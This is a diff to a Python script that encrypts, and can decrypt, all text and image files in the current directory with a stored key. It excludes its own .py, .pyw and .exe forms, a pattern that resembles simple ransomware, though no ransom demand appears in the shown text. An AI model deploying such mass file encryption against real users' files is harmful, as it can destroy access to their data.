@@ -20,15 +20,19 @@ def load_encryption_key():
     return key
 
 #function to encrypt all files in the current directory
+ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png'}
+
 def encrypt_files():
     key = load_encryption_key()
     files = []
 
     for file in os.listdir():
-        if file == "encrypt.py" or file == "encryption.key":
+        if file == "encrypt.py" or file == "encryption.key" or file == "encrypt.exe" or file == "encrypt.pyw":
             continue
         if os.path.isfile(file):
-            files.append(file)
+            _, file_extension = os.path.splitext(file)
+            if file_extension.lower() in ALLOWED_EXTENSIONS:
+                files.append(file)
 
     for file in files:
         with open(file, "rb") as thefile:
@@ -50,10 +54,12 @@ def decrypt_files():
         files = []
 
         for file in os.listdir():
-            if file == "encrypt.py" or file == "encryption.key":
+            if file == "encrypt.py" or file == "encryption.key" or file == "encrypt.exe" or file == "encrypt.pyw":
                 continue
             if os.path.isfile(file):
-                files.append(file)
+                _, file_extension = os.path.splitext(file)
+                if file_extension.lower() in ALLOWED_EXTENSIONS:
+                    files.append(file)
 
         for file in files:
             try:
